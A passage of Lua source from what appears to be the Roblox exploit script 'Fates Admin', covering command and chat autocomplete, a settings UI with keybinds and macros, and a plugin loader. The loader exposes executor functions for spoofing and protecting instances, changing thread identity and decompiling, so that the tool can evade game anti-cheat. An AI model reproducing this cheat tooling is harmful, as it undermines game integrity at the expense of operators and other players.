			for _, v in next, CommandsTable do
				local CommandName = v.Name
				local Aliases = v.Aliases
				local FoundAlias

				if (Utils.MatchSearch(Args[1], CommandName)) then -- better search
					Prediction.Text = CommandName
					CommandArgs = v.Args or {}
					break
				end

				for _, v2 in next, Aliases do
					if (Utils.MatchSearch(Args[1], v2)) then
						FoundAlias = true
						Prediction.Text = v2
						CommandArgs = v2.Args or {}
						break
					end

					if (FoundAlias) then
						break
					end
				end
			end
		end

		for i, v in next, Args do -- make it get more players after i space out
			if (i > 1 and v ~= "") then
				local Predict = ""
				if (#CommandArgs >= 1) then
					for i2, v2 in next, CommandArgs do
						if (lower(v2) == "player") then
							Predict = Utils.GetPlayerArgs(v) or Predict;
						else
							Predict = Utils.MatchSearch(v, v2) and v2 or Predict
						end
					end
				else
					Predict = Utils.GetPlayerArgs(v) or Predict;
				end
				Prediction.Text = sub(Text, 1, #Text - #Args[#Args]) .. Predict
				local split = split(v, ",");
				if (next(split)) then
					for i2, v2 in next, split do
						if (i2 > 1 and v2 ~= "") then
							local PlayerName = Utils.GetPlayerArgs(v2)
							Prediction.Text = sub(Text, 1, #Text - #split[#split]) .. (PlayerName or "")
						end
					end
				end
			end
		end

		if (Sfind(Text, "\t")) then -- remove tab from preditction text also
			CommandBar.Input.Text = PredictionText
			CommandBar.Input.CursorPosition = #CommandBar.Input.Text + 1
		end
	end))


	do
		local Enabled = false
		local Connection;
		local Predict;
		ToggleChatPrediction = function()
			if (_L.Frame2) then
				return
			end
			if (not Enabled) then
				local RobloxChat = LocalPlayer.PlayerGui and FindFirstChild(LocalPlayer.PlayerGui, "Chat");
				local RobloxChatBarFrame;
				if (RobloxChat) then
					local RobloxChatFrame = FindFirstChild(RobloxChat, "Frame");
					if (RobloxChatFrame) then
						RobloxChatBarFrame = FindFirstChild(RobloxChatFrame, "ChatBarParentFrame");
					end
				end
				local PredictionClone, ChatBar
				if (RobloxChatBarFrame) then
					local Frame1 = FindFirstChild(RobloxChatBarFrame, 'Frame');
					if Frame1 then
						local BoxFrame = FindFirstChild(Frame1, 'BoxFrame');
						if BoxFrame then
							_L.Frame2 = FindFirstChild(BoxFrame, 'Frame');
							if _L.Frame2 then
								local TextLabel = FindFirstChild(_L.Frame2, 'TextLabel');
								ChatBar = FindFirstChild(_L.Frame2, 'ChatBar');
								if TextLabel and ChatBar then
									PredictionClone = InstanceNew('TextLabel');
									PredictionClone.Font = TextLabel.Font
									PredictionClone.LineHeight = TextLabel.LineHeight
									PredictionClone.MaxVisibleGraphemes = TextLabel.MaxVisibleGraphemes
									PredictionClone.RichText = TextLabel.RichText
									PredictionClone.Text = ''
									PredictionClone.TextColor3 = TextLabel.TextColor3
									PredictionClone.TextScaled = TextLabel.TextScaled
									PredictionClone.TextSize = TextLabel.TextSize
									PredictionClone.TextStrokeColor3 = TextLabel.TextStrokeColor3
									PredictionClone.TextStrokeTransparency = TextLabel.TextStrokeTransparency
									PredictionClone.TextTransparency = 0.3
									PredictionClone.TextTruncate = TextLabel.TextTruncate
									PredictionClone.TextWrapped = TextLabel.TextWrapped
									PredictionClone.TextXAlignment = TextLabel.TextXAlignment
									PredictionClone.TextYAlignment = TextLabel.TextYAlignment
									PredictionClone.Name = "Predict"
									PredictionClone.Size = UDim2.new(1, 0, 1, 0);
									PredictionClone.BackgroundTransparency = 1
								end
							end
						end
					end
				end

				ParentGui(PredictionClone, _L.Frame2);
				Predict = PredictionClone

				Connection = AddConnection(CConnect(GetPropertyChangedSignal(ChatBar, "Text"), function() -- todo: add detection for /e
					local Text = ChatBar.Text
					local Prediction = PredictionClone
					local PredictionText = PredictionClone.Text

					local Args = split(concat(shift(split(Text, ""))), " ");

					Prediction.Text = ""
					if (not startsWith(Text, Prefix)) then
						return
					end

					local FoundCommand = false
					local FoundAlias = false
					CommandArgs = CommandArgs or {}
					if (not rawget(CommandsTable, Args[1])) then
						for _, v in next, CommandsTable do
							local CommandName = v.Name
							local Aliases = v.Aliases
							local FoundAlias

							if (Utils.MatchSearch(Args[1], CommandName)) then -- better search
								Prediction.Text = Prefix .. CommandName
								FoundCommand = true
								CommandArgs = v.Args or {}
								break
							end

							for _, v2 in next, Aliases do
								if (Utils.MatchSearch(Args[1], v2)) then
									FoundAlias = true
									Prediction.Text = v2
									CommandArgs = v.Args or {}
									break
								end

								if (FoundAlias) then
									break
								end
							end
						end
					end

					for i, v in next, Args do -- make it get more players after i space out
						if (i > 1 and v ~= "") then
							local Predict = ""
							if (#CommandArgs >= 1) then
								for i2, v2 in next, CommandArgs do
									if (lower(v2) == "player") then
										Predict = Utils.GetPlayerArgs(v) or Predict;
									else
										Predict = Utils.MatchSearch(v, v2) and v2 or Predict
									end
								end
							else
								Predict = Utils.GetPlayerArgs(v) or Predict;
							end
							Prediction.Text = sub(Text, 1, #Text - #Args[#Args]) .. Predict
							local split = split(v, ",");
							if (next(split)) then
								for i2, v2 in next, split do
									if (i2 > 1 and v2 ~= "") then
										local PlayerName = Utils.GetPlayerArgs(v2)
										Prediction.Text = sub(Text, 1, #Text - #split[#split]) .. (PlayerName or "")
									end
								end
							end
						end
					end

					if (Sfind(Text, "\t")) then -- remove tab from preditction text also
						ChatBar.Text = PredictionText
						ChatBar.CursorPosition = #ChatBar.Text + 2
					end
				end))
				Enabled = true
				return ChatBar
			else
				Disconnect(Connection);
				Destroy(Predict);
				Enabled = false
			end
			return _L.Frame2
		end

		if (CurrentConfig.ChatPrediction) then
			delay(2, ToggleChatPrediction);
		end
	end

	local ConfigUILib = {}
	do
		local GuiObjects = ConfigElements
		local PageCount = 0
		local SelectedPage
		local UserInputService = Services.UserInputService

		local Colors = {
			ToggleEnabled = Color3.fromRGB(5, 5, 6);
			Background = Color3.fromRGB(32, 33, 36);
			ToggleDisabled = Color3.fromRGB(27, 28, 31);
		}

		local ColorElements = ConfigElements.Elements.ColorElements
		local Overlay = ColorElements.Overlay
		local OverlayMain = Overlay.Main
		local ColorPicker = OverlayMain.ColorPicker
		local Settings = OverlayMain.Settings
		local ClosePicker = OverlayMain.Close
		local ColorCanvas = ColorPicker.ColorCanvas
		local ColorSlider = ColorPicker.ColorSlider
		local ColorGradient = ColorCanvas.ColorGradient
		local DarkGradient = ColorGradient.DarkGradient
		local CanvasBar = ColorGradient.Bar
		local RainbowGradient = ColorSlider.RainbowGradient
		local SliderBar = RainbowGradient.Bar
		local CanvasHitbox = ColorCanvas.Hitbox
		local SliderHitbox = ColorSlider.Hitbox
		local ColorPreview = Settings.ColorPreview
		local ColorOptions = Settings.Options
		local RedTextBox = ColorOptions.Red.TextBox
		local BlueTextBox = ColorOptions.Blue.TextBox
		local GreenTextBox = ColorOptions.Green.TextBox
		local RainbowToggle = ColorOptions.Rainbow

		local function UpdateClone()
			ConfigUIClone = Clone(ConfigUI);
		end

		function ConfigUILib.NewPage(Title)
			local Page = Clone(GuiObjects.Page.Container);
			local TextButton = Clone(GuiObjects.Page.TextButton);

			Page.Visible = true
			TextButton.Visible = true

			Utils.Click(TextButton, "BackgroundColor3")

			if PageCount == 0 then
				SelectedPage = Page
			end

			AddConnection(CConnect(TextButton.MouseButton1Click, function()
				if SelectedPage.Name ~= TextButton.Name then          
					SelectedPage = Page
					ConfigUI.Container.UIPageLayout:JumpTo(SelectedPage)
				end
			end))

			Page.Name = Title
			TextButton.Name = Title
			TextButton.Text = Title

			Page.Parent = ConfigUI.Container
			TextButton.Parent = ConfigUI.Selection

			PageCount = PageCount + 1


			UpdateClone()

			local function GetKeyName(KeyCode)
				local _, Stringed = pcall(UserInputService.GetStringForKeyCode, UserInputService, KeyCode);
				local IsEnum = Stringed == ""
				return (not IsEnum and _) and Stringed or split(tostring(KeyCode), ".")[3], (IsEnum and not _);
			end

			local PageLibrary = {}

			function PageLibrary.CreateMacroSection(MacrosToAdd, Callback)
				local Macro = Clone(GuiObjects.Elements.Macro);
				local MacroPage = Macro.MacroPage
				local Selection = Page.Selection

				Selection.ClearAllChildren(Selection);
				for i,v in next, GetChildren(MacroPage) do
					v.Parent = Selection
				end
				Selection.Container.Visible = true
				local CommandsList = Selection.Container.Commands.Frame.List
				local CurrentMacros = Selection.Container.CurrentMacros
				local AddMacro = Selection.AddMacro
				local BindA, CommandA, ArgsA = AddMacro.Bind, AddMacro.Command, AddMacro["z Args"]
				local Add = AddMacro.AddMacro
				local Keybind = {};
				local Enabled = false
				local Connection

				local OnClick = function()
					Enabled = not Enabled
					if Enabled then
						BindA.Text = "..."
						local OldShiftLock = LocalPlayer.DevEnableMouseLock
						LocalPlayer.DevEnableMouseLock = false
						Keybind = {}
						Connection = AddConnection(CConnect(UserInputService.InputBegan, function(Input, Processed)
							if not Processed and Input.UserInputType == Enum.UserInputType.Keyboard then
								local Input2, Proccessed2;
								CThread(function()
									Input2, Proccessed2 = CWait(UserInputService.InputBegan);
								end)()
								CWait(UserInputService.InputEnded);
								if (Input2 and not Processed) then
									local KeyName, IsEnum = GetKeyName(Input.KeyCode);
									local KeyName2, IsEnum2 = GetKeyName(Input2.KeyCode); 
									BindA.Text = format("%s + %s", IsEnum2 and KeyName2 or KeyName, IsEnum2 and KeyName2 or KeyName2);
									Keybind[1] = Input.KeyCode
									Keybind[2] = Input2.KeyCode
								else
									local KeyName = GetKeyName(Input.KeyCode);
									BindA.Text = KeyName
									Keybind[1] = Input.KeyCode
									Keybind[2] = nil
								end
								LocalPlayer.DevEnableMouseLock = OldShiftLock
							else
								BindA.Text = "Bind"
							end
							Enabled = false
							Disconnect(Connection);
						end));
					else
						BindA.Text = "Bind"
						Disconnect(Connection);
					end
				end

				AddConnection(CConnect(BindA.MouseButton1Click, OnClick));
				AddConnection(CConnect(Add.MouseButton1Click, function()
					if (BindA.Text == "Bind") then
						Utils.Notify(nil, nil, "You must assign a keybind");
						return
					end
					if (not CommandsTable[CommandA.Text]) then
						Utils.Notify(nil, nil, "You must add a command");
						return
					end
					Callback(Keybind, CommandA.Text, ArgsA.Text);
				end));

				local Focused = false
				local MacroSection = {
					CommandsList = CommandsList,
					AddCmd = function(Name) 
						local Command = Clone(Macro.Command);
						Command.Name = Name
						Command.Text = Name
						Command.Parent = CommandsList
						Command.Visible = true
						AddConnection(CConnect(Command.MouseButton1Click, function()
							CommandA.Text = Name
							ArgsA.CaptureFocus(ArgsA);
							Focused = true
							CWait(ArgsA.FocusLost);
							CWait(UserInputService.InputBegan);
							Focused = false
							wait(.2);
							if (not Focused) then
								OnClick();
							end
						end))
					end,
					AddMacro = function(MacroName, Bind)
						local NewMacro = Clone(Macro.EditMacro);
						NewMacro.Bind.Text = Bind
						NewMacro.Macro.Text = MacroName
						NewMacro.Parent = CurrentMacros
						NewMacro.Visible = true

						Utils.Thing(NewMacro.Bind);
						Utils.Thing(NewMacro.Macro);

						FindFirstChild(NewMacro, "Remove").Name = "Delete"
						AddConnection(CConnect(NewMacro.Delete.MouseButton1Click, function()
							CWait(Utils.TweenAllTrans(NewMacro, .25).Completed);
							Destroy(NewMacro);
							for i = 1, #Macros do
								if (Macros[i].Command == split(MacroName, " ")[1]) then
									Macros[i] = nil
								end
							end
							local TempMacros = clone(Macros);
							for i, v in next, TempMacros do
								for i2, v2 in next, v.Keys do
									TempMacros[i]["Keys"][i2] = split(tostring(v2), ".")[3]
								end
							end
							SetConfig({Macros=TempMacros});
						end))
					end
				}

				for i, v in next, MacrosToAdd do
					local Suc, Err = pcall(concat, v.Args, " ");
					if (not Suc) then
						SetConfig({Macros={}});
						Utils.Notify(LocalPlayer, "Error", "Macros were reset due to corrupted data")
						break;
					end
					local KeyName, IsEnum = GetKeyName(v.Keys[1]);
					local Formatted;
					if (v.Keys[2]) then
						local KeyName2, IsEnum2 = GetKeyName(v.Keys[2]); 
						Formatted = format("%s + %s", IsEnum2 and KeyName2 or KeyName, IsEnum2 and KeyName2 or KeyName2);
					else
						Formatted = KeyName
					end
					MacroSection.AddMacro(v.Command .. " " .. concat(v.Args, " "), Formatted);
				end

				return MacroSection
			end

			function PageLibrary.NewSection(Title)
				local Section = Clone(GuiObjects.Section.Container);
				local SectionOptions = Section.Options
				local SectionUIListLayout = SectionOptions.UIListLayout

				Section.Visible = true

				Utils.SmoothScroll(Section.Options, .14)
				Section.Title.Text = Title
				Section.Parent = Page.Selection


				SectionOptions.CanvasSize = UDim2.fromOffset(0,0) --// change
				AddConnection(CConnect(GetPropertyChangedSignal(SectionUIListLayout, "AbsoluteContentSize"), function()
					SectionOptions.CanvasSize = UDim2.fromOffset(0, SectionUIListLayout.AbsoluteContentSize.Y + 5);
				end));

				UpdateClone();

				local ElementLibrary = {}


				function ElementLibrary.Toggle(Title, Enabled, Callback)
					local Toggle = Clone(GuiObjects.Elements.Toggle);
					local Container = Toggle.Container

					local Switch = Container.Switch
					local Hitbox = Container.Hitbox

					if not Enabled then
						Switch.Position = UDim2.fromOffset(2, 2)
						Container.BackgroundColor3 = Colors.ToggleDisabled
					end
					local NoCallback = false

					local OnClick = function()
						Enabled = not Enabled

						Utils.Tween(Switch, "Quad", "Out", .25, {
							Position = Enabled and UDim2.new(1, -18, 0, 2) or UDim2.fromOffset(2, 2)
						})
						Utils.Tween(Container, "Quad", "Out", .25, {
							BackgroundColor3 = Enabled and Colors.ToggleEnabled or Colors.ToggleDisabled
						})

						if (not NoCallback) then
							Callback(Enabled);
						end
					end

					AddConnection(CConnect(Hitbox.MouseButton1Click, OnClick));

					Toggle.Visible = true
					Toggle.Title.Text = Title
					Toggle.Parent = Section.Options
					Utils.Thing(Toggle.Title);

					UpdateClone()

					return function()
						NoCallback = true
						OnClick();
						NoCallback = false
					end
				end

				function ElementLibrary.ScrollingFrame(Title, Callback, Elements, Toggles)
					local ScrollingFrame = Clone(GuiObjects.Elements.ScrollingFrame);
					local Frame = ScrollingFrame.Frame
					local Toggle = ScrollingFrame.Toggle

					for ElementTitle, Enabled in next, Elements do
						local NewToggle = Clone(Toggle);
						NewToggle.Visible = true
						NewToggle.Title.Text = ElementTitle
						NewToggle.Plugins.Text = Enabled and (Toggles and Toggles[1] or "Enabled") or (Toggles and Toggles[2] or "Disabled");


						Utils.Click(NewToggle.Plugins, "BackgroundColor3")

						AddConnection(CConnect(NewToggle.Plugins.MouseButton1Click, function()
							Enabled = not Enabled
							NewToggle.Plugins.Text = Enabled and (Toggles and Toggles[1] or "Enabled") or (Toggles and Toggles[2] or "Disabled");

							Callback(ElementTitle, Enabled);
						end));

						NewToggle.Parent = Frame.Container
					end

					Frame.Visible = true
					Frame.Title.Text = Title
					Frame.Parent = Section.Options

					for _, NewToggle in next, GetChildren(Frame.Container) do
						if (IsA(NewToggle, "GuiObject")) then
							Utils.Thing(NewToggle.Title);
						end
					end

					UpdateClone()
				end

				function ElementLibrary.Keybind(Title, Bind, Callback)
					local Keybind = Clone(GuiObjects.Elements.Keybind);
					local Enabled = false
					local Connection

					Keybind.Container.Text = Bind
					Keybind.Title.Text = Title

					local Container = Keybind.Container
					AddConnection(CConnect(Container.MouseButton1Click, function()
						Enabled = not Enabled

						if Enabled then
							Container.Text = "..."
							local OldShiftLock = LocalPlayer.DevEnableMouseLock
							-- disable shift lock so it doesn't interfere with keybind
							LocalPlayer.DevEnableMouseLock = false
							Connection = AddConnection(CConnect(UserInputService.InputBegan, function(Input, Processed)
								if not Processed and Input.UserInputType == Enum.UserInputType.Keyboard then
									local Input2, Proccessed2;
									CThread(function()
										Input2, Proccessed2 = CWait(UserInputService.InputBegan);
									end)()
									CWait(UserInputService.InputEnded);
									if (Input2 and not Processed) then
										local KeyName, IsEnum = GetKeyName(Input.KeyCode);
										local KeyName2, IsEnum2 = GetKeyName(Input2.KeyCode); 
										-- Order by if it's an enum first, example 'Shift + K' and not 'K + Shift'
										Container.Text = format("%s + %s", IsEnum2 and KeyName2 or KeyName, IsEnum2 and KeyName2 or KeyName2);
										Callback(Input.KeyCode, Input2.KeyCode);
									else
										local KeyName = GetKeyName(Input.KeyCode);
										Container.Text = KeyName
										Callback(Input.KeyCode);
									end
									LocalPlayer.DevEnableMouseLock = OldShiftLock
								else
									Container.Text = "press"
								end
								Enabled = false
								Disconnect(Connection);
							end));
						else
							Container.Text = "press"
							Disconnect(Connection);
						end
					end));

					Utils.Click(Container, "BackgroundColor3");
					Keybind.Visible = true
					Keybind.Parent = Section.Options
					UpdateClone();
				end

				function ElementLibrary.TextboxKeybind(Title, Bind, Callback)
					local Keybind = Clone(GuiObjects.Elements.TextboxKeybind);

					Keybind.Container.Text = Bind
					Keybind.Title.Text = Title

					local Container = Keybind.Container
					AddConnection(CConnect(GetPropertyChangedSignal(Container, "Text"), function(Key)
						if (#Container.Text >= 1) then
							Container.Text = sub(Container.Text, 1, 1);
							Callback(Container.Text);
							Container.ReleaseFocus(Container);
						end
					end))

					Keybind.Visible = true
					Keybind.Parent = Section.Options
					UpdateClone();
				end

				function ElementLibrary.ColorPicker(Title, DefaultColor, Callback)
					local SelectColor = Clone(ColorElements.SelectColor);
					local CurrentColor = DefaultColor
					local Button = SelectColor.Button
					local ToHSV = DefaultColor.ToHSV
					local Color3New = Color3.new
					local Color3fromHSV = Color3.fromHSV
					local UDim2New = UDim2.new
					local clamp = math.clamp

					local H, S, V = ToHSV(DefaultColor);
					local Opened = false
					local Rainbow = false

					local function UpdateText()
						RedTextBox.PlaceholderText = tostring(math.floor(CurrentColor.R * 255))
						GreenTextBox.PlaceholderText = tostring(math.floor(CurrentColor.G * 255))
						BlueTextBox.PlaceholderText = tostring(math.floor(CurrentColor.B * 255))
					end

					local function UpdateColor()
						H, S, V = ToHSV(CurrentColor);

						SliderBar.Position = UDim2New(0, 0, H, 2);
						CanvasBar.Position = UDim2New(S, 2, 1 - V, 2);
						ColorGradient.UIGradient.Color = Utils.MakeGradient({
							[1] = Color3New(1, 1, 1);
							[2] = Color3fromHSV(H, 1, 1);
						})

						ColorPreview.BackgroundColor3 = CurrentColor
						UpdateText();
					end

					local function UpdateHue(Hue)
						SliderBar.Position = UDim2New(0, 0, Hue, 2);
						ColorGradient.UIGradient.Color = Utils.MakeGradient({
							[1] = Color3New(1, 1, 1);
							[2] = Color3fromHSV(Hue, 1, 1);
						});

						ColorPreview.BackgroundColor3 = CurrentColor
						UpdateText();
					end

					local function ColorSliderInit()
						local Moving = false

						local function Update()
							if Opened and not Rainbow then
								local LowerBound = SliderHitbox.AbsoluteSize.Y
								local Position = clamp(Mouse.Y - SliderHitbox.AbsolutePosition.Y, 0, LowerBound);
								local Value = Position / LowerBound

								H = Value
								CurrentColor = Color3fromHSV(H, S, V);
								ColorPreview.BackgroundColor3 = CurrentColor
								ColorGradient.UIGradient.Color = Utils.MakeGradient({
									[1] = Color3New(1, 1, 1);
									[2] = Color3fromHSV(H, 1, 1);
								});

								UpdateText();

								local Position = UDim2.new(0, 0, Value, 2)
								local Tween = Utils.Tween(SliderBar, "Linear", "Out", .05, {
									Position = Position
								});

								Callback(CurrentColor);
								CWait(Tween.Completed);
							end
						end

						AddConnection(CConnect(SliderHitbox.MouseButton1Down, function()
							Moving = true
							Update()
						end))

						AddConnection(CConnect(UserInputService.InputEnded, function(Input)
							if Input.UserInputType == Enum.UserInputType.MouseButton1 and Moving then
								Moving = false
							end
						end))

						AddConnection(CConnect(Mouse.Move, Utils.Debounce(function()
							if Moving then
								Update()
							end
						end)))
					end
					local function ColorCanvasInit()
						local Moving = false

						local function Update()
							if Opened then
								local LowerBound = CanvasHitbox.AbsoluteSize.Y
								local YPosition = clamp(Mouse.Y - CanvasHitbox.AbsolutePosition.Y, 0, LowerBound)
								local YValue = YPosition / LowerBound
								local RightBound = CanvasHitbox.AbsoluteSize.X
								local XPosition = clamp(Mouse.X - CanvasHitbox.AbsolutePosition.X, 0, RightBound)
								local XValue = XPosition / RightBound

								S = XValue
								V = 1 - YValue

								CurrentColor = Color3fromHSV(H, S, V);
								ColorPreview.BackgroundColor3 = CurrentColor
								UpdateText()

								local Position = UDim2New(XValue, 2, YValue, 2);
								local Tween = Utils.Tween(CanvasBar, "Linear", "Out", .05, {
									Position = Position
								});
								Callback(CurrentColor);
								CWait(Tween.Completed);
							end
						end

						AddConnection(CConnect(CanvasHitbox.MouseButton1Down, function()
							Moving = true
							Update()
						end))

						AddConnection(CConnect(UserInputService.InputEnded, function(Input)
							if Input.UserInputType == Enum.UserInputType.MouseButton1 and Moving then
								Moving = false
							end
						end))

						AddConnection(CConnect(Mouse.Move, Utils.Debounce(function()
							if Moving then
								Update()
							end
						end)))
					end

					ColorSliderInit()
					ColorCanvasInit()

					AddConnection(CConnect(Button.MouseButton1Click, function()
						if not Opened then
							Opened = true
							UpdateColor()
							RainbowToggle.Container.Switch.Position = Rainbow and UDim2New(1, -18, 0, 2) or UDim2.fromOffset(2, 2)
							RainbowToggle.Container.BackgroundColor3 = Color3.fromRGB(25, 25, 25);
							Overlay.Visible = true
							OverlayMain.Visible = false
							Utils.Intro(OverlayMain)
						end
					end))

					AddConnection(CConnect(ClosePicker.MouseButton1Click, Utils.Debounce(function()
						Button.BackgroundColor3 = CurrentColor
						Utils.Intro(OverlayMain)
						Overlay.Visible = false
						Opened = false
					end)))

					AddConnection(CConnect(RedTextBox.FocusLost, function()
						if Opened then
							local Number = tonumber(RedTextBox.Text)
							if Number then
								Number = clamp(floor(Number), 0, 255)
								CurrentColor = Color3New(Number / 255, CurrentColor.G, CurrentColor.B)
								UpdateColor()
								RedTextBox.PlaceholderText = tostring(Number)
								Callback(CurrentColor)
							end
							RedTextBox.Text = ""
						end
					end))

					AddConnection(CConnect(GreenTextBox.FocusLost, function()
						if Opened then
							local Number = tonumber(GreenTextBox.Text)
							if Number then
								Number = clamp(floor(Number), 0, 255)
								CurrentColor = Color3New(CurrentColor.R, Number / 255, CurrentColor.B)
								UpdateColor()
								GreenTextBox.PlaceholderText = tostring(Number)
								Callback(CurrentColor)
							end
							GreenTextBox.Text = ""
						end
					end))

					AddConnection(CConnect(BlueTextBox.FocusLost, function()
						if Opened then
							local Number = tonumber(BlueTextBox.Text)
							if Number then
								Number = clamp(floor(Number), 0, 255)
								CurrentColor = Color3New(CurrentColor.R, CurrentColor.G, Number / 255)
								UpdateColor()
								BlueTextBox.PlaceholderText = tostring(Number)
								Callback(CurrentColor)
							end
							BlueTextBox.Text = ""
						end
					end))

					Utils.ToggleFunction(RainbowToggle.Container, false, function(Callback)
						if Opened then
							Rainbow = Callback
						end
					end)

					AddConnection(CConnect(RenderStepped, function()
						if Rainbow then
							local Hue = (tick() / 5) % 1
							CurrentColor = Color3.fromHSV(Hue, S, V)

							if Opened then
								UpdateHue(Hue)
							end

							Button.BackgroundColor3 = CurrentColor
							Callback(CurrentColor, true);
						end
					end))

					Button.BackgroundColor3 = DefaultColor
					SelectColor.Title.Text = Title
					SelectColor.Visible = true
					SelectColor.Parent = Section.Options
					Utils.Thing(SelectColor.Title);
				end

				return ElementLibrary
			end

			return PageLibrary
		end
	end

	Utils.Click(ConfigUI.Close, "TextColor3")
	AddConnection(CConnect(ConfigUI.Close.MouseButton1Click, function()
		ConfigLoaded = false
		CWait(Utils.TweenAllTrans(ConfigUI, .25).Completed);
		ConfigUI.Visible = false
	end))
	--END IMPORT [uimore]


	--IMPORT [plugin]
	PluginConf = IsSupportedExploit and GetPluginConfig();
	local Plugins;

	PluginLibrary = {
		LocalPlayer = LocalPlayer,
		Services = Services,
		GetCharacter = GetCharacter,
		ProtectInstance = ProtectInstance,
		SpoofInstance = SpoofInstance,
		SpoofProperty = SpoofProperty,
		UnSpoofInstance = UnSpoofInstance,
		ReplaceCharacter = ReplaceCharacter,
		ReplaceHumanoid = ReplaceHumanoid,
		GetCorrectToolWithHandle = GetCorrectToolWithHandle,
		DisableAnimate = DisableAnimate,
		GetPlayer = GetPlayer,
		GetHumanoid = GetHumanoid,
		GetRoot = GetRoot,
		GetMagnitude = GetMagnitude,
		GetCommandEnv = function(Name)
			local Command = LoadCommand(Name);
			if (Command.CmdEnv) then
				return Command.CmdEnv
			end
		end,
		isR6 = isR6,
		ExecuteCommand = ExecuteCommand,
		Notify = Utils.Notify,
		HasTool = HasTool,
		isSat = isSat,
		Request = syn and syn.request or request or game.HttpGet,
		CThread = CThread,
		AddConnection = AddConnection,
		filter = filter,
		map = map,
		clone = clone,
		firetouchinterest = firetouchinterest,
		fireproximityprompt = fireproximityprompt,
		decompile = decompile,
		getnilinstances = getnilinstances,
		getinstances = getinstances,
		Drawing = Drawing
	}

	do
		local IsDebug = IsSupportedExploit and PluginConf.PluginDebug

		Plugins = IsSupportedExploit and map(filter(listfiles("fates-admin/plugins"), function(i, v)
			return lower(split(v, ".")[#split(v, ".")]) == "lua"
		end), function(i, v)
			local splitted = split(v, "\\");
			if (identifyexecutor and identifyexecutor() == "ScriptWare") then
				return {splitted[#splitted], loadfile("fates-admin/plugins/" .. v)}
			else
				return {splitted[#splitted], loadfile(v)}
			end
		end) or {}

		if (SafePlugins) then
			local Renv = clone(getrenv(), true);
			for i, v in next, Renv do
				PluginLibrary[i] = v
			end
		end
		PluginLibrary.debug = nil
		PluginLibrary.getfenv = nil
		PluginLibrary.loadstring = loadstring

		if (PluginConf.SafePlugins) then
			local Funcs = {}
			for i, v in next, PluginLibrary do
				if (type(v) == 'function') then
					Funcs[#Funcs + 1] = v
				end
			end
			local FateEnv = getfenv(1);
			PluginLibrary.getfenv = newcclosure(function(...)
				local f = ({...})[1]
				local Env = getfenv(...);
				if (type(f) == 'function' and Tfind(Funcs, f) or Env == FateEnv and checkcaller()) then
					return PluginLibrary
				end
				return Env
			end)
		end

		if (PluginConf.PluginsEnabled) then
			local LoadPlugin = function(Plugin)
				if (not IsSupportedExploit) then
					return 
				end

				if (Plugin and PluginConf.DisabledPlugins[Plugin.Name]) then
					Utils.Notify(LocalPlayer, "Plugin not loaded.", format("Plugin %s was not loaded as it is on the disabled list.", Plugin.Name));
					return "Disabled"
				end
				if (#keys(Plugin) < 3) then
					return Utils.Notify(LocalPlayer, "Plugin Fail", "One of your plugins is missing information.");
				end
				if (IsDebug) then
					Utils.Notify(LocalPlayer, "Plugin loading", format("Plugin %s is being loaded.", Plugin.Name));
				end

				local Context;
				local sett, gett = setthreadidentity, getthreadidentity
				if (sett and PluginConf.SafePlugins) then
					Context = gett();
					sett(5);
				end
				local Ran, Return = pcall(Plugin.Init);
				if (sett and Context) then
					sett(Context);
				end
				if (not Ran and Return and IsDebug) then
					return Utils.Notify(LocalPlayer, "Plugin Fail", format("there is an error in plugin Init %s: %s", Plugin.Name, Return));
				end

				for i, command in next, Plugin.Commands or {} do -- adding the "or" because some people might have outdated plugins in the dir
					if (#keys(command) < 3) then
						Utils.Notify(LocalPlayer, "Plugin Command Fail", format("Command %s is missing information", command.Name));
						continue
					end
					AddCommand(command.Name, command.Aliases or {}, command.Description .. " - " .. Plugin.Author, command.Requirements or {}, command.Func, true);

					if (FindFirstChild(Commands.Frame.List, command.Name)) then
						Destroy(FindFirstChild(Commands.Frame.List, command.Name));
					end
					local Clone = Clone(Command);
					Utils.Hover(Clone, "BackgroundColor3");
					Utils.ToolTip(Clone, format("%s\n%s - %s", command.Name, command.Description, Plugin.Author));
					Clone.CommandText.RichText = true
					Clone.CommandText.Text = format("%s %s %s", command.Name, next(command.Aliases or {}) and format("(%s)", concat(command.Aliases, ", ")) or "", Utils.TextFont("[PLUGIN]", {77, 255, 255}));
					Clone.Name = command.Name
					Clone.Visible = true
					Clone.Parent = Commands.Frame.List
					if (IsDebug) then
						Utils.Notify(LocalPlayer, "Plugin Command Loaded", format("Command %s loaded successfully", command.Name));
					end
				end
			end

			if (IsSupportedExploit) then
				if (not isfolder("fates-admin") and not isfolder("fates-admin/plugins") and not isfolder("fates-admin/plugin-conf.json") or not isfolder("fates-admin/chatlogs")) then
					WriteConfig();
				end
			end

			for i, Plugin in next, Plugins do
				local PluginFunc = Plugin[2]
				if (PluginConf.SafePlugins) then
					setfenv(PluginFunc, PluginLibrary);
				else
					local CurrentEnv = getfenv(PluginFunc);
					for i2, v2 in next, PluginLibrary do
						CurrentEnv[i2] = v2
					end
				end
				local Success, Ret = pcall(PluginFunc);
				if (Success) then
					LoadPlugin(Ret);
				elseif (PluginConf.PluginDebug) then
					Utils.Notify(LocalPlayer, "Fail", "There was an error Loading plugin (console for more information)");
					warn("[FA Plugin Error]: " .. debug.traceback(Ret));             
				end
			end

			AddCommand("refreshplugins", {"rfp", "refreshp", "reloadp"}, "Loads all new plugins.", {}, function()
				if (not IsSupportedExploit) then
					return "your exploit does not support plugins"
				end
				PluginConf = GetPluginConfig();
				IsDebug = PluginConf.PluginDebug

				Plugins = map(filter(listfiles("fates-admin/plugins"), function(i, v)
					return lower(split(v, ".")[#split(v, ".")]) == "lua"
				end), function(i, v)
					return {split(v, "\\")[2], loadfile(v)}
				end)

				for i, Plugin in next, Plugins do
					local PluginFunc = Plugin[2]
					setfenv(PluginFunc, PluginLibrary);
					local Success, Ret = pcall(PluginFunc);
					if (Success) then
						LoadPlugin(Ret);
					elseif (PluginConf.PluginDebug) then
						Utils.Notify(LocalPlayer, "Fail", "There was an error Loading plugin (console for more information)");
						warn("[FA Plugin Error]: " .. debug.traceback(Ret));             
					end
				end
			end)
		end
	end
	--END IMPORT [plugin]


	WideBar = false
	Draggable = false

	--IMPORT [config]
	do
		local UserInputService = Services.UserInputService
		local GetStringForKeyCode = UserInputService.GetStringForKeyCode
		local function GetKeyName(KeyCode)
			local _, Stringed = pcall(GetStringForKeyCode, UserInputService, KeyCode);
			local IsEnum = Stringed == ""
			return (not IsEnum and _) and Stringed or split(tostring(KeyCode), ".")[3], (IsEnum and not _);
		end

		local SortKeys = function(Key1, Key2)
			local KeyName, IsEnum = GetKeyName(Key1);
			if (Key2) then
				local KeyName2, IsEnum2 = GetKeyName(Key2);
